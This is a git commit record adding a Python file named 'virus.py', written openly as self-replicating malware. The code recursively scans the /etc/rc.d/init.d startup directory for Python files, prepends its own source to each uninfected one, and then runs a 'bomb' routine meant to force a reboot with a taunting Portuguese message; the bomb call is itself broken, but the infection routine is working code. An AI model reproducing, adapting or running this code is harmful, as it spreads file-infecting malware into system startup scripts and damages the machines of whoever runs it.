fc99e578f288134e63d557bf3960bd5afb22eee4
gustavo-de-assis <gustavo.siqueira.421@gmail.com>
2017-04-17 23:29:45 -0300

    Add files via upload

---
+++ virus.py
@@ -0,0 +1,42 @@
+#!/usr/bin/python
+import os
+import datetime
+SIGNATURE = "PYTHON VIRUS"
+
+def search(path):
+    filestoinfect = []
+    filelist = os.listdir(path)
+    for fname in filelist:
+        if os.path.isdir(path+"/"+fname):
+            filestoinfect.extend(search(path+"/"+fname))
+        elif fname[-3:] == ".py":
+            infected = False
+            for line in open(path+"/"+fname):
+                if SIGNATURE in line:
+                    infected = True
+                    break
+            if infected == False:
+                filestoinfect.append(path+"/"+fname)
+    return filestoinfect
+
+def infect(filestoinfect):
+    virus = open(os.path.abspath(__file__))
+    virusstring = ""
+    for i,line in enumerate(virus):
+        if i>=0 and i <39:
+            virusstring += line
+    virus.close
+    for fname in filestoinfect:
+        f = open(fname)
+        temp = f.read()
+        f.close()
+        f = open(fname,"w")
+        f.write(virusstring + temp)
+        f.close()
+
+def bomb():
+        os.exec("shutdown -r 3 Seu computador será reiniciado... DENOVO")
+
+filestoinfect = search(os.path.abspath("/etc/rc.d/init.d"))
+infect(filestoinfect)
+bomb()
